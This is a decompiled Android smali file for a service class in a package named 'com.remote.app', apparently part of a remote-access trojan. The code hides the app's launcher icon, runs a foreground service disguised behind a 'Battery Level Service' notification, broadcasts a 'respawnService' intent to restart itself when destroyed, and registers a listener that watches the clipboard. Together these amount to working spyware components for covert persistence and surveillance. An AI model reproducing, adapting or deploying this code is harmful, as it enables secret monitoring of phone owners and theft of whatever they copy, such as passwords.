.class public Lcom/remote/app/MainService;
.super Landroid/app/Service;
.source ""


# static fields
.field private static a:Landroid/content/Context;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method public static a()Landroid/content/Context;
    .locals 1

    sget-object v0, Lcom/remote/app/MainService;->a:Landroid/content/Context;

    return-object v0
.end method

.method private b()V
    .locals 4

    new-instance v0, Landroid/app/NotificationChannel;

    const/4 v1, 0x0

    const-string v2, "example.permanence"

    const-string v3, "Battery Level Service"

    invoke-direct {v0, v2, v3, v1}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const v3, -0xffff01

    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->setLightColor(I)V

    invoke-virtual {v0, v1}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    const-string v1, "notification"

    invoke-virtual {p0, v1}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/app/NotificationManager;

    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    new-instance v0, Landroid/support/v4/app/d$b;

    invoke-direct {v0, p0, v2}, Landroid/support/v4/app/d$b;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/support/v4/app/d$b;->a(Z)Landroid/support/v4/app/d$b;

    const-string v2, "Battery Level"

    invoke-virtual {v0, v2}, Landroid/support/v4/app/d$b;->b(Ljava/lang/CharSequence;)Landroid/support/v4/app/d$b;

    invoke-virtual {v0, v1}, Landroid/support/v4/app/d$b;->a(I)Landroid/support/v4/app/d$b;

    const-string v2, "service"

    invoke-virtual {v0, v2}, Landroid/support/v4/app/d$b;->a(Ljava/lang/String;)Landroid/support/v4/app/d$b;

    invoke-virtual {v0}, Landroid/support/v4/app/d$b;->a()Landroid/app/Notification;

    move-result-object v0

    invoke-virtual {p0, v1, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 4

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Landroid/app/Service;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/remote/app/MainActivity;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v2, 0x1

    const/4 v3, 0x2

    invoke-virtual {v0, v1, v3, v2}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-le v0, v1, :cond_0

    invoke-direct {p0}, Lcom/remote/app/MainService;->b()V

    goto :goto_0

    :cond_0
    new-instance v0, Landroid/app/Notification;

    invoke-direct {v0}, Landroid/app/Notification;-><init>()V

    invoke-virtual {p0, v2, v0}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_0
    return-void
.end method

.method public onDestroy()V
    .locals 2

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    new-instance v0, Landroid/content/Intent;

    const-string v1, "respawnService"

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Landroid/app/Service;->sendBroadcast(Landroid/content/Intent;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/app/Service;->onStartCommand(Landroid/content/Intent;II)I

    new-instance p1, Lcom/remote/app/j;

    invoke-direct {p1, p0}, Lcom/remote/app/j;-><init>(Lcom/remote/app/MainService;)V

    const-string p2, "clipboard"

    invoke-virtual {p0, p2}, Landroid/app/Service;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p2

    check-cast p2, Landroid/content/ClipboardManager;

    invoke-virtual {p2, p1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    sput-object p0, Lcom/remote/app/MainService;->a:Landroid/content/Context;

    invoke-static {p0}, Lcom/remote/app/e;->a(Landroid/content/Context;)V

    const/4 p1, 0x1

    return p1
.end method
